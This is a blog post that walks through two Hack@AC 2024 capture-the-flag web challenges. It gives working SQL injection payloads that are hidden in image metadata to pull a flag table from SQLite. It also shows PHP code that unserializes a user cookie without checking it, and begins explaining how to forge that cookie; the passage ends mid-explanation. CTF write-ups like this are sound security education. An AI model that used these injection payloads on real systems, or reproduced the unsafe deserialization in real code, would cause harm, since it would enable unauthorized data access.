@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Hack@AC 2024 I took part in Hack@AC 2024 with the team ඞඞඞඞ. We attained 4th place in the tertiary category, having the same score as 3rd place, simply submitting the last flag later than them :(
+Additionally, I won the first blood prize for solving the challenge web/Libwary.
+🩸 web/Fruit Color Query One of the more interesting sql injection challenges.
+Reconnaissance Going to the website and using the sample apple picture provided, it seems that it outputs the colour of the fruit.
+" />
+<meta name="keywords" content=", ctf, pwn, web" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#494f5c" />
+<link rel="canonical" href="https://enxgmatic.github.io/blog/hack@ac/" />
+
+
+    <title>
+        
+            Hack@AC 2024 - enxgmatic&#39;s hidey hole 
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="/main.5fcad444a7849ba937342f254165b4c1cd5a34a191cd61d23fe4623b1f3a5452.css" integrity="sha256-X8rURKeEm6k3NC8lQWW0wc1aNKGRzWHSP&#43;RiOx86VFI=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hack@AC 2024">
+  <meta itemprop="description" content="Hack@AC 2024 I took part in Hack@AC 2024 with the team ඞඞඞඞ. We attained 4th place in the tertiary category, having the same score as 3rd place, simply submitting the last flag later than them :(
+Additionally, I won the first blood prize for solving the challenge web/Libwary.
+🩸 web/Fruit Color Query One of the more interesting sql injection challenges.
+Reconnaissance Going to the website and using the sample apple picture provided, it seems that it outputs the colour of the fruit.">
+  <meta itemprop="datePublished" content="2024-02-29T17:43:43+08:00">
+  <meta itemprop="dateModified" content="2024-02-29T17:43:43+08:00">
+  <meta itemprop="wordCount" content="1881">
+  <meta itemprop="keywords" content="Ctf,Pwn,Web">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hack@AC 2024">
+  <meta name="twitter:description" content="Hack@AC 2024 I took part in Hack@AC 2024 with the team ඞඞඞඞ. We attained 4th place in the tertiary category, having the same score as 3rd place, simply submitting the last flag later than them :(
+Additionally, I won the first blood prize for solving the challenge web/Libwary.
+🩸 web/Fruit Color Query One of the more interesting sql injection challenges.
+Reconnaissance Going to the website and using the sample apple picture provided, it seems that it outputs the colour of the fruit.">
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2024-02-29 17:43:43 &#43;0800 &#43;08" />
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">~</span>
+            <span class="logo__text ">
+                $ ./enxgmatic</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/blog/">Blog</a></li><li><a href="/about/">About</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title" style="margin-bottom:6px">
+        <a href="https://enxgmatic.github.io/blog/hack@ac/">Hack@AC 2024</a>
+      </h1>
+
+      
+
+      <div class="post-info" style="margin-top:6px">
+        
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://enxgmatic.github.io/tags/ctf/">ctf</a></span>
+        <span class="tag"><a href="https://enxgmatic.github.io/tags/pwn/">pwn</a></span>
+        <span class="tag"><a href="https://enxgmatic.github.io/tags/web/">web</a></span>
+        
+    </p>
+
+        
+        
+        
+  
+        <p>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+            <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+            <line x1="16" y1="2" x2="16" y2="6"></line>
+            <line x1="8" y1="2" x2="8" y2="6"></line>
+            <line x1="3" y1="10" x2="21" y2="10"></line>
+          </svg>
+          
+            2024-02-29 17:43 &#43;0800
+          
+  
+           
+            
+          
+        </p>
+
+        <br>
+      </div>
+
+      
+        <hr>
+        <aside id="toc">
+          <div class="toc-title">Table of Contents:</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#-webfruit-color-query">🩸 web/Fruit Color Query</a>
+      <ul>
+        <li><a href="#reconnaissance">Reconnaissance</a></li>
+        <li><a href="#sql-injection">SQL Injection</a></li>
+        <li><a href="#a-short-note-on-union-attacks">A short note on UNION attacks</a></li>
+      </ul>
+    </li>
+    <li><a href="#weblibwary">🩸web/Libwary</a>
+      <ul>
+        <li><a href="#reconnaissance-1">Reconnaissance</a></li>
+        <li><a href="#controlling-the-cookie">Controlling the cookie</a></li>
+        <li><a href="#php-insecure-deserialization">PHP Insecure Deserialization</a></li>
+        <li><a href="#getting-flagtxt">Getting flag.txt</a></li>
+        <li><a href="#bypassing-the-final-defence">Bypassing the final defence</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </aside>
+        <hr>
+
+      
+
+      <div class="post-content">
+        <h1 id="hackac-2024">Hack@AC 2024</h1>
+<p>I took part in Hack@AC 2024 with the team ඞඞඞඞ. We attained 4th place in the tertiary category, having the same score as 3rd place, simply submitting the last flag later than them :(</p>
+<p><img src="assets/leaderboard.png" alt=""></p>
+<p>Additionally, I won the first blood prize for solving the challenge <a href="#weblibwary"><code>web/Libwary</code></a>.</p>
+<h2 id="-webfruit-color-query">🩸 web/Fruit Color Query</h2>
+<p>One of the more interesting sql injection challenges.</p>
+<h3 id="reconnaissance">Reconnaissance</h3>
+<p>Going to the website and using the sample apple picture provided, it seems that it outputs the colour of the fruit.</p>
+<div style="display:flex;">
+    <img src='assets/fruit (1).png' width="48%">
+    <img src='assets/fruit (2).png' width="48%">
+</div>
+<p>However, when you input a different jpg file, the website instead writes <code>Cannot Verify Your Picture is A Fruit. Please Add a Metadata to Your Picture.</code></p>
+<img src="assets/fruit (3).png" width="75%">
+<p>From my teammate&rsquo;s tinkering, she figured out that the website would refer to the picture&rsquo;s &ldquo;title&rdquo; and &ldquo;subject&rdquo; metadata  to determine the fruit type.</p>
+<img src="assets/fruit (4).png" width="60%">
+<p>From the sample image, when the &ldquo;title&rdquo; and &ldquo;subject&rdquo; metadata are labelled as <code>apple</code>, the website outputs red. When you change the metadata to <code>banana</code>, the website outputs yellow.</p>
+<p>However, when you change the metadata to <code>flag</code> or some other bogus value, the website returns an error.</p>
+<img src="assets/fruit (5).png">
+<p>That was when my teammate guessed it was probably a SQL Injection challenge.</p>
+<br>
+<h3 id="sql-injection">SQL Injection</h3>
+<p>To solve this challenge, we will make use of a <a href="https://portswigger.net/web-security/sql-injection/union-attacks">UNION</a> attack, as we need to obtain data from other tables in the database.</p>
+<p>First up, we need to figure out what table and column in the database contains the flag. For this, I used <a href="https://www.sqlite.org/schematab.html"><code>sqlite_master</code></a>, a table that stores the schema of the database (this only applies to sqlite, I simply guessed that the application was using that).</p>
+<p>My plan was to <code>SELECT sql FROM sqlite_master</code>, which tells us the <code>CREATE TABLE</code> query that was executed. This way, we can see the name and columns of all the tables in the database.</p>
+<br>
+<p>To execute that, we will edit the metadata of the file to be <code>' UNION SELECT sql FROM sqlite_master --</code>.</p>
+<ul>
+<li><code>'</code> closes the string</li>
+<li><code>UNION SELECT</code> lets us query data outside of the current table we are in</li>
+<li><code>sql</code> is the column we are selecting from the table <code>sqlite_master</code></li>
+<li><code>--</code> comments out the rest of the query, so as to avoid any errors caused by the end of the query (eg the trailing <code>'</code> at the end)</li>
+</ul>
+<img src="assets/fruit (7).png">
+<br>
+<p>Thus, the full query becomes <code>SELECT &lt;colour&gt; FROM &lt;fruit_table&gt; WHERE &lt;fruit&gt;='' UNION SELECT sql FROM sqlite_master--'</code>.</p>
+<p>This returns the sql of the table since <code>SELECT &lt;colour&gt; FROM &lt;fruit_table&gt; WHERE &lt;fruit&gt;=''</code> will return nothing.</p>
+<br>
+<p>When we input the file with the metadata as stated, we get this output:</p>
+<img src="assets/fruit (6).png" width="75%">
+<p>Nice, we now know the table name is <code>flag</code> and the the column is <code>flag</code> of the datatype <code>TEXT</code> (Click <a href="https://www.programiz.com/sql/create-table">here</a> for more about the CREATE TABLE syntax).</p>
+<p>Now, we just need to use another UNION attack, this time to UNION SELECT the flag instead. We adjust the metadata to be <code>' UNION SELECT flag FROM flag--</code>.</p>
+<img src="assets/fruit (8).png">
+<p>And when we submit the image, the application returns the flag.</p>
+<img src="assets/fruit (9).png" width="70%">
+<p>Flag: <code>ACSI{sql1_i5_d34d?_1_d0n't_r341ly_Kn0w}</code></p>
+<br>
+<h3 id="a-short-note-on-union-attacks">A short note on UNION attacks</h3>
+<p>When I solved the challenge, and used <code>UNION SELECT sql FROM sqlite_master</code>, it actually returned the sql schema for the fruits table instead of the flag table.</p>
+<img src="assets/fruit (11).png" width="70%">
+<p><code>UNION SELECT sql FROM sqlite_master</code> returns the sql schema of <u>all</u> the tables in the database (in this case, 2 tables). However, the webpage only returns the first result (between the 2 tables). Thus, it may return the wrong table.</p>
+<p>To solve that problem, add <code>LIMIT 1 OFFSET 1</code> to the sql injection query. This basically offsets the result by 1, to grab the 2nd table.</p>
+<img src="assets/fruit (10).png" width="70%">
+<br>
+<h2 id="weblibwary">🩸web/Libwary</h2>
+<p>Won the first blood prize for this :D</p>
+<h3 id="reconnaissance-1">Reconnaissance</h3>
+<p>Pulling up the website, it let us select a book and prints out its contents, one of which is &ldquo;the flag&rdquo;. However, selecting that gives us this:</p>
+<img src="assets/libwary (1).png">
+<p>Additionally, the website also states our username at the top.</p>
+<p>Let&rsquo;s dive into the source code.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">index</span><span class="o">.</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;util.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$option</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;book&#39;</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$option</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s2">&#34;User&#34;</span><span class="o">.</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">uniqid</span><span class="p">(),</span><span class="mi">5</span><span class="p">,</span><span class="mi">9</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;IE=edge&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Libwary<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span> Welcome to the Libwary™,  
+</span></span><span class="line"><span class="cl">        <span class="cp">&lt;?php 
+</span></span></span><span class="line"><span class="cl"><span class="cp">            echo $user;
+</span></span></span><span class="line"><span class="cl"><span class="cp">        ?&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span> Select a book to read <span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;index.php&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">select</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;book&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;1&#34;</span><span class="p">&gt;</span>A Love Story<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;2&#34;</span><span class="p">&gt;</span>The Hackerman<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;3&#34;</span><span class="p">&gt;</span>The Egg<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;4&#34;</span><span class="p">&gt;</span>Exploring the Castle<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;5&#34;</span><span class="p">&gt;</span> The Flag <span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">select</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Read&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span> <span class="cp">&lt;?php 
+</span></span></span><span class="line"><span class="cl"><span class="cp">        if ($option != -1){
+</span></span></span><span class="line"><span class="cl"><span class="cp">            $book = new Book($option);
+</span></span></span><span class="line"><span class="cl"><span class="cp">            echo $book;
+</span></span></span><span class="line"><span class="cl"><span class="cp">        }
+</span></span></span><span class="line"><span class="cl"><span class="cp">        else{
+</span></span></span><span class="line"><span class="cl"><span class="cp">            echo &#34;Please select a book to read&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="cp">        }
+</span></span></span><span class="line"><span class="cl"><span class="cp">    ?&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>A post request is sent based on the book we choose. Also, our username is obtained from our PHPSESSID cookie, which is serialized from the User class (shown below).</p>
+<ul>
+<li><a href="https://www.php.net/manual/en/function.serialize.php">Serialization</a> generates a storable representation of PHP values, without losing their type and structure</li>
+</ul>
+<p>Now, looking at <code>util.php</code>, we see 2 classes defined: <code>Book</code> and <code>User</code>. Let&rsquo;s first focus on the Book class.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$titles</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;lovestory.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;hackerstory.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;eggstory.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;castlestory.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;flag.txt&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//bro thought he was cool by using classes for everything...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Book</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$option</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$option</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">option</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$option</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;titles&#39;</span><span class="p">][</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">option</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//if option was the flag, don&#39;t allow the user to read it
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">option</span> <span class="o">==</span> <span class="mi">5</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="s2">&#34;fakeflag.txt&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__tostring</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//final defence
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">!=</span> <span class="s2">&#34;fakeflag.txt&#34;</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//read the file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;books/&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//make it look nicer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>From here, we can see why selecting &ldquo;the flag&rdquo; doesn&rsquo;t work:</p>
+<p>When an object with the class <code>Book</code> is first created (via <code>__construct()</code>), if we chose &ldquo;the flag&rdquo; as the book, it will be converted to &ldquo;fakeflag.txt&rdquo; instead.</p>
+<p>It also has a final defence in <code>__tostring</code> (what is represented when the Book class is treated as a string), where it removes all occurences of &ldquo;flag&rdquo; in the name of the book chosen (unless it is &ldquo;fakeflag.txt&rdquo;).</p>
+<p>Now moving on to the User class:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__tostring</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Not much to say, it just consists of a name. The <code>__tostring</code> method returns the name of the user. In this case, said <code>__tostring</code> method will be triggered at the following portion of the code (<code>echo</code> is similar to <code>print</code> in outputting data to the screen).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span> Welcome to the Libwary™,  
+</span></span><span class="line"><span class="cl">    <span class="cp">&lt;?php 
+</span></span></span><span class="line"><span class="cl"><span class="cp">        echo $user;
+</span></span></span><span class="line"><span class="cl"><span class="cp">    ?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>That is why our username is able to be dynamically displayed on the webpage.</p>
+<p>So how can we solve this problem? The defences to prevent us from accessing &ldquo;flag.txt&rdquo; in <code>Book</code> all seem quite legit&hellip;</p>
+<br>
+<h3 id="controlling-the-cookie">Controlling the cookie</h3>
+<p>Remember earlier where our username is determined from our cookie?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s2">&#34;User&#34;</span><span class="o">.</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">uniqid</span><span class="p">(),</span><span class="mi">5</span><span class="p">,</span><span class="mi">9</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><figure>
+  <img src="assets/libwary (2).png" width=70%>
+  <figcaption style="text-align:center">The PHPSESSID cookie</figcaption>
+</figure>
+<p>Since we can control the value of the cookie, what if we decide to change the value of PHPSESSID?</p>
+<ul>
+<li>You can use extensions to change the value of the cookie (I am using <a href="https://cookie-editor.com/">Cookie-Editor</a>)</li>
+</ul>
+<br>
+<p>Typing bogus values leads to the username not even being displayed. This is because we face a deserizaliation error.</p>
+<figure>
+  <img src="assets/libwary (3).png" width="70%">
+  <figcaption style="text-align:center">Typing bogus values into the PHPSESSID cookie</figcaption>
+</figure>
+<figure>
+  <img src="assets/libwary (7).png" width="90%">
+  <figcaption style="text-align:center">When we try to unserialize bogus values, it will lead to an error</figcaption>
+</figure>
+<p>Thus, to change our username without throwing an error, we need to encode it the same way as how the cookie was encoded in the code:</p>
